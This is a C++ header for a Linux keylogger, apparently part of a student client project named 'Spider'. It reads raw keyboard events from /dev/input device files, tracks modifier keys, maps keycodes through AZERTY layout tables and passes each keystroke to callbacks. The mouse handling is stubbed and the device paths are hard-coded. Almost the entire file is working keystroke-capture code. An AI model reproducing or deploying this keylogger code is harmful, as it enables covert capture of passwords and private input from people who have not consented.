//
// Created by roman sztergbaum on 27/09/2017.
//

#ifndef SPIDER_CLIENT_LINUXKEYLOGGER_HPP
#define SPIDER_CLIENT_LINUXKEYLOGGER_HPP

#include <linux/input.h>
#include <memory>
#include <unordered_map>
#include <boost/bind.hpp>
#include <config/Config.hpp>
#include <KeyLogger/KeyLogger.hpp>
#include <Protocol/MessagesEnums.hpp>
#include <Network/IOManager.hpp>
#include <Network/PosixStream.hpp>
#include <Network/BufferView.hpp>

namespace spi::details
{
    class FileWatcher
    {
    public:
        using MouseMoveCallback = std::function<void(proto::MouseMove &)>;
        using KeyPressCallback = std::function<void(proto::KeyEvent &)>;
        using MouseClickCallback = std::function<void(proto::MouseClick &)>;

        FileWatcher(net::IOManager &mgr, int fd) : _stream(mgr, fd)
        {
            _buff.resize(sizeof(input_event));
        }

        void stop()
        {
            _stream.cancel();
        }

        void asyncRead()
        {
            _nbReadBytes = 0;
            _stream.asyncRead(_buff, boost::bind(&FileWatcher::__keypadInput, this, net::ErrorPlaceholder,
                                                 net::BytesTransferredPlaceholder));
        }

        void onMouseMoveEvent(MouseMoveCallback &&callback) noexcept
        {
            _mouseMoveCallback = std::move(callback);
        }

        void onMouseClickEvent(MouseClickCallback &&callback) noexcept
        {
            _mouseClickCallback = std::move(callback);
        }

        void onKeyboardEvent(KeyPressCallback &&callback) noexcept
        {
            _keyPressCallback = std::move(callback);
        }

    private:
        void __keypadInput(const ErrorCode &err, std::size_t len)
        {
            if (err) {
                _log(logging::Warning) << "couldn't read key input file " << err.message() << std::endl;
                return;
            }

            _nbReadBytes += len;
            if (_nbReadBytes < sizeof(input_event)) {
                __readMore();
            } else {
                struct input_event ie;
                std::memcpy(&ie, _buff.data(), len);
                proto::KeyEvent keyEvent;

                keyEvent.state = ie.value ? proto::KeyState::Down : proto::KeyState::Up;
                keyEvent.timestamp = std::chrono::system_clock::now();
                if (_toBinds->find(ie.code) != _toBinds->end() && ie.value <= 2) {
                    keyEvent.code = _toBinds->at(ie.code);
                    if (ie.value <= 1) {
                        switch (keyEvent.code) {
                            case proto::KeyCode::CapsLock :
                                if (keyEvent.state == proto::KeyState::Down)
                                    _capsStatus = !_capsStatus;
                                break;
                            case proto::KeyCode::Shift :
                                _shiftStatus = keyEvent.state == proto::KeyState::Down;
                                break;
                            case proto::KeyCode::AltGr :
                                _altGrStatus = keyEvent.state == proto::KeyState::Down;
                                break;
                            default:
                                break;
                        }
                    }
                    if (_altGrStatus)
                        _toBinds = &_altGred;
                    else if (_capsStatus ^ _shiftStatus)
                        _toBinds = &_shifted;
                    else
                        _toBinds = &_unaltered;
                    _log(logging::Debug) << " code : " << ie.code << " event : " << keyEvent.code.toString()
                                         << " state = " << keyEvent.state.toString() << " value = " << ie.value
                                         << std::endl;
                    if (!(keyEvent.state == proto::KeyState::Up
                          && std::find(_printable.begin(), _printable.end(), ie.code) != _printable.end())
                        && !(ie.value == 2
                             && std::find(_printable.begin(), _printable.end(), ie.code) == _printable.end())) {
                        _keyPressCallback(keyEvent);
                    } else
                        _log(logging::Warning) << " Unhandled behavior {" << ie.code << " value : " << ie.value << "}"
                                               << std::endl;
                } else {
                    _log(logging::Warning) << " Unhandled KeyEvent {" << ie.code << "}" << std::endl;
                }
                asyncRead();
            }
        }

        void __readMore()
        {
            _stream.asyncRead(net::BufferView(_buff.data() + _nbReadBytes, _buff.size() - _nbReadBytes),
                              boost::bind(&FileWatcher::__keypadInput, this, net::ErrorPlaceholder,
                                          net::BytesTransferredPlaceholder));
        }

        Buffer _buff;
        unsigned long _nbReadBytes{0};
        net::PosixStream _stream;
        logging::Logger _log{"Keylogger-filewatcher", logging::Debug};
        MouseMoveCallback _mouseMoveCallback;
        MouseClickCallback _mouseClickCallback;
        KeyPressCallback _keyPressCallback;
        bool _altGrStatus{false};
        bool _shiftStatus{false};
        bool _capsStatus{false};
        std::unordered_map<unsigned long, proto::KeyCode> const *_toBinds{&_unaltered};

        static const std::array<char, 51> _printable;
        static const std::unordered_map<unsigned long, proto::KeyCode> _unaltered;
        static const std::unordered_map<unsigned long, proto::KeyCode> _shifted;
        static const std::unordered_map<unsigned long, proto::KeyCode> _altGred;
    };

    const std::array<char, 51> FileWatcher::_printable = {16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 30, 31, 32, 33, 34,
                                                          35, 36, 37, 38, 39, 44, 45, 46, 47, 48, 49, 11, 2, 3, 4, 5, 6,
                                                          7, 8, 9, 10, 12, 13, 26, 27, 40, 43, 50, 51, 52, 53, 86, 57,
                                                          14, 15, 28};
    const std::unordered_map<unsigned long, proto::KeyCode> FileWatcher::_unaltered = {
        {16,  proto::KeyCode::a},
        {17,  proto::KeyCode::z},
        {18,  proto::KeyCode::e},
        {19,  proto::KeyCode::r},
        {20,  proto::KeyCode::t},
        {21,  proto::KeyCode::y},
        {22,  proto::KeyCode::u},
        {23,  proto::KeyCode::i},
        {24,  proto::KeyCode::o},
        {25,  proto::KeyCode::p},
        {30,  proto::KeyCode::q},
        {31,  proto::KeyCode::s},
        {32,  proto::KeyCode::d},
        {33,  proto::KeyCode::f},
        {34,  proto::KeyCode::g},
        {35,  proto::KeyCode::h},
        {36,  proto::KeyCode::j},
        {37,  proto::KeyCode::k},
        {38,  proto::KeyCode::l},
        {39,  proto::KeyCode::m},
        {44,  proto::KeyCode::w},
        {45,  proto::KeyCode::x},
        {46,  proto::KeyCode::c},
        {47,  proto::KeyCode::v},
        {48,  proto::KeyCode::b},
        {49,  proto::KeyCode::n},
        {14,  proto::KeyCode::Backspace},
        {15,  proto::KeyCode::Tab},
        {1,   proto::KeyCode::Escape},
        {42,  proto::KeyCode::Shift},
        {54,  proto::KeyCode::Shift},
        {57,  proto::KeyCode::Space},
        {29,  proto::KeyCode::Ctrl},
        {97,  proto::KeyCode::Ctrl},
        {56,  proto::KeyCode::Alt},
        {100, proto::KeyCode::AltGr},
        {11,  proto::KeyCode::GraveA},
        {2,   proto::KeyCode::Ampersand},
        {3,   proto::KeyCode::AcuteE},
        {4,   proto::KeyCode::DoubleQuote},
        {5,   proto::KeyCode::Quote},
        {6,   proto::KeyCode::OpeningParenthesis},
        {7,   proto::KeyCode::Dash},
        {8,   proto::KeyCode::GraveE},
        {9,   proto::KeyCode::Underscore},
        {10,  proto::KeyCode::CedillaC},
        {56,  proto::KeyCode::Alt},
        {100, proto::KeyCode::AltGr},
        {59,  proto::KeyCode::F1},
        {60,  proto::KeyCode::F2},
        {61,  proto::KeyCode::F3},
        {62,  proto::KeyCode::F4},
        {63,  proto::KeyCode::F5},
        {64,  proto::KeyCode::F6},
        {65,  proto::KeyCode::F7},
        {66,  proto::KeyCode::F8},
        {67,  proto::KeyCode::F9},
        {68,  proto::KeyCode::F10},
        {87,  proto::KeyCode::F11},
        {88,  proto::KeyCode::F12},
        {104, proto::KeyCode::PageUp},
        {109, proto::KeyCode::PageDown},
        {111, proto::KeyCode::Delete},
        {50,  proto::KeyCode::Comma},
        {51,  proto::KeyCode::Semicolon},
        {52,  proto::KeyCode::Colon},
        {53,  proto::KeyCode::Exclamation},
        {86,  proto::KeyCode::Inferior},
        {110, proto::KeyCode::Inser},
        {102, proto::KeyCode::Start},
        {107, proto::KeyCode::End},
        {105, proto::KeyCode::Left},
        {103, proto::KeyCode::Up},
        {108, proto::KeyCode::Down},
        {106, proto::KeyCode::Right},
        {125, proto::KeyCode::Home},
        {27,  proto::KeyCode::Dollar},
        {43,  proto::KeyCode::Star},
        {40,  proto::KeyCode::GraveU},
        {26,  proto::KeyCode::Caret},
        {28,  proto::KeyCode::Enter},
        {58,  proto::KeyCode::CapsLock},
        {12,  proto::KeyCode::ClosingParenthesis},
        {13,  proto::KeyCode::Equal}
    };
    const std::unordered_map<unsigned long, proto::KeyCode> FileWatcher::_shifted = {
        {16,  proto::KeyCode::A},
        {17,  proto::KeyCode::Z},
        {18,  proto::KeyCode::E},
        {19,  proto::KeyCode::R},
        {20,  proto::KeyCode::T},
        {21,  proto::KeyCode::Y},
        {22,  proto::KeyCode::U},
        {23,  proto::KeyCode::I},
        {24,  proto::KeyCode::O},
        {25,  proto::KeyCode::P},
        {30,  proto::KeyCode::Q},
        {31,  proto::KeyCode::S},
        {32,  proto::KeyCode::D},
        {33,  proto::KeyCode::F},
        {34,  proto::KeyCode::G},
        {35,  proto::KeyCode::H},
        {36,  proto::KeyCode::J},
        {37,  proto::KeyCode::K},
        {38,  proto::KeyCode::L},
        {39,  proto::KeyCode::M},
        {44,  proto::KeyCode::W},
        {45,  proto::KeyCode::X},
        {46,  proto::KeyCode::C},
        {47,  proto::KeyCode::V},
        {48,  proto::KeyCode::B},
        {49,  proto::KeyCode::N},
        {14,  proto::KeyCode::Backspace},
        {15,  proto::KeyCode::Tab},
        {1,   proto::KeyCode::Escape},
        {42,  proto::KeyCode::Shift},
        {54,  proto::KeyCode::Shift},
        {57,  proto::KeyCode::Space},
        {29,  proto::KeyCode::Ctrl},
        {97,  proto::KeyCode::Ctrl},
        {56,  proto::KeyCode::Alt},
        {100, proto::KeyCode::AltGr},
        {11,  proto::KeyCode::_0},
        {2,   proto::KeyCode::_1},
        {3,   proto::KeyCode::_2},
        {4,   proto::KeyCode::_3},
        {5,   proto::KeyCode::_4},
        {6,   proto::KeyCode::_5},
        {7,   proto::KeyCode::_6},
        {8,   proto::KeyCode::_7},
        {9,   proto::KeyCode::_8},
        {10,  proto::KeyCode::_9},
        {56,  proto::KeyCode::Alt},
        {100, proto::KeyCode::AltGr},
        {59,  proto::KeyCode::F1},
        {60,  proto::KeyCode::F2},
        {61,  proto::KeyCode::F3},
        {62,  proto::KeyCode::F4},
        {63,  proto::KeyCode::F5},
        {64,  proto::KeyCode::F6},
        {65,  proto::KeyCode::F7},
        {66,  proto::KeyCode::F8},
        {67,  proto::KeyCode::F9},
        {68,  proto::KeyCode::F10},
        {87,  proto::KeyCode::F11},
        {88,  proto::KeyCode::F12},
        {104, proto::KeyCode::PageUp},
        {109, proto::KeyCode::PageDown},
        {111, proto::KeyCode::Delete},
        {50,  proto::KeyCode::Interrogation},
        {51,  proto::KeyCode::Dot},
        {52,  proto::KeyCode::Slash},
        {53,  proto::KeyCode::Selection},
        {86,  proto::KeyCode::Superior},
        {110, proto::KeyCode::Inser},
        {102, proto::KeyCode::Start},
        {107, proto::KeyCode::End},
        {105, proto::KeyCode::Left},
        {103, proto::KeyCode::Up},
        {108, proto::KeyCode::Down},
        {106, proto::KeyCode::Right},
        {125, proto::KeyCode::Home},
        {27,  proto::KeyCode::Pound},
        {43,  proto::KeyCode::Mu},
        {40,  proto::KeyCode::Modulo},
        {26,  proto::KeyCode::Trema},
        {28,  proto::KeyCode::Enter},
        {58,  proto::KeyCode::CapsLock},
        {12,  proto::KeyCode::Round},
        {13,  proto::KeyCode::Plus}
    };
    const std::unordered_map<unsigned long, proto::KeyCode> FileWatcher::_altGred = {
        {17,  proto::KeyCode::Inferior},
        {18,  proto::KeyCode::Euro},
        {39,  proto::KeyCode::Mu},
        {45,  proto::KeyCode::Superior},
        {47,  proto::KeyCode::DoubleQuote},
        {48,  proto::KeyCode::DoubleQuote},
        {49,  proto::KeyCode::n},
        {14,  proto::KeyCode::Backspace},
        {15,  proto::KeyCode::Tab},
        {1,   proto::KeyCode::Escape},
        {42,  proto::KeyCode::Shift},
        {54,  proto::KeyCode::Shift},
        {57,  proto::KeyCode::Space},
        {29,  proto::KeyCode::Ctrl},
        {97,  proto::KeyCode::Ctrl},
        {56,  proto::KeyCode::Alt},
        {100, proto::KeyCode::AltGr},
        {11,  proto::KeyCode::Arobase},
        {3,   proto::KeyCode::Tilde},
        {4,   proto::KeyCode::Sharp},
        {5,   proto::KeyCode::OpeningBracket},
        {6,   proto::KeyCode::OpeningSquareBracket},
        {7,   proto::KeyCode::Pipe},
        {8,   proto::KeyCode::BackQuote},
        {9,   proto::KeyCode::Backslash},
        {10,  proto::KeyCode::Caret},
        {56,  proto::KeyCode::Alt},
        {100, proto::KeyCode::AltGr},
        {59,  proto::KeyCode::F1},
        {60,  proto::KeyCode::F2},
        {61,  proto::KeyCode::F3},
        {62,  proto::KeyCode::F4},
        {63,  proto::KeyCode::F5},
        {64,  proto::KeyCode::F6},
        {65,  proto::KeyCode::F7},
        {66,  proto::KeyCode::F8},
        {67,  proto::KeyCode::F9},
        {68,  proto::KeyCode::F10},
        {87,  proto::KeyCode::F11},
        {88,  proto::KeyCode::F12},
        {109, proto::KeyCode::Tilde},
        {111, proto::KeyCode::Delete},
        {50,  proto::KeyCode::Quote},
        {53,  proto::KeyCode::Dot},
        {86,  proto::KeyCode::Pipe},
        {102, proto::KeyCode::Start},
        {107, proto::KeyCode::End},
        {105, proto::KeyCode::Left},
        {103, proto::KeyCode::Up},
        {108, proto::KeyCode::Down},
        {106, proto::KeyCode::Right},
        {125, proto::KeyCode::Home},
        {27,  proto::KeyCode::Currency},
        {43,  proto::KeyCode::BackQuote},
        {40,  proto::KeyCode::Caret},
        {26,  proto::KeyCode::Trema},
        {28,  proto::KeyCode::Enter},
        {58,  proto::KeyCode::CapsLock},
        {12,  proto::KeyCode::ClosingSquareBracket},
        {13,  proto::KeyCode::ClosingBracket}
    };
}

namespace spi
{
    class LinuxKeyLogger : public KeyLogger
    {
    public:
        explicit LinuxKeyLogger(net::IOManager &service) noexcept : _service(service)
        {
            _buff.resize(sizeof(input_event));

            // parse /proc/bus/input/devices
            // and construct the vectors of files to watch
        }

        ~LinuxKeyLogger() noexcept override
        {
            _log(logging::Info) << "Shutting down" << std::endl;
            stop();
        }

        bool setup() noexcept override
        {
            for (const auto &i : _keyPadToWatch) {
                int currentFd = ::open(i.c_str(), O_RDONLY);

                if (currentFd == -1) {
                    _log(logging::Error) << "Unable to open file '" << i << "'" << std::endl;
                    return false;
                }
                _keyInputStream.push_back(details::FileWatcher(_service, currentFd));
                _keyInputStream.back().onMouseMoveEvent(boost::bind(&LinuxKeyLogger::__onMouEv, this, _1));
                _keyInputStream.back().onMouseClickEvent(boost::bind(&LinuxKeyLogger::__onCliEv, this, _1));
                _keyInputStream.back().onKeyboardEvent(boost::bind(&LinuxKeyLogger::__onKeyEv, this, _1));
            }

            _log(logging::Info) << "Successfully initialized" << std::endl;
            return true;
        }

        void run() override
        {
            if (!_running) {
                _log(logging::Info) << "Starting" << std::endl;

                for (auto &cur : _keyInputStream) {
                    cur.asyncRead();
                }
                _running = true;
            }
        }

        void stop() override
        {
            if (_running) {
                _log(logging::Info) << "Stopping" << std::endl;

                for (auto &cur : _keyInputStream) {
                    cur.stop();
                }
                _running = false;
            }
        }

        void clear() noexcept
        {
            _keyInputStream.clear();
            _mouseInputStream.clear();
        }

    private:

        void __onKeyEv(proto::KeyEvent ev)
        {
            _keyPressCallback(std::move(ev));
        }

        void __onMouEv(proto::MouseMove ev)
        {
            _mouseMoveCallback(std::move(ev));
        }

        void __onCliEv(proto::MouseClick ev)
        {
            _mouseClickCallback(std::move(ev));
        }

        bool _running{false};
        // only works with tek pc, need to be constructed out of
        // the parsing of /proc/bus/input/devices
        std::vector<char> _buff;
        std::vector<details::FileWatcher> _keyInputStream;
        std::vector<net::PosixStream> _mouseInputStream;
        net::IOManager &_service;
        std::vector<std::string> _keyPadToWatch{"/dev/input/event3"};
        std::vector<std::string> _mouseToWatch{"/dev/input/event4", "/dev/input/event7"};
    };
}

namespace spi::details
{
    static always_inline KeyLogPtr createKeyLogger(net::IOManager &service)
    {
        return std::make_unique<LinuxKeyLogger>(service);
    }
}
#endif //SPIDER_CLIENT_LINUXKEYLOGGER_HPP
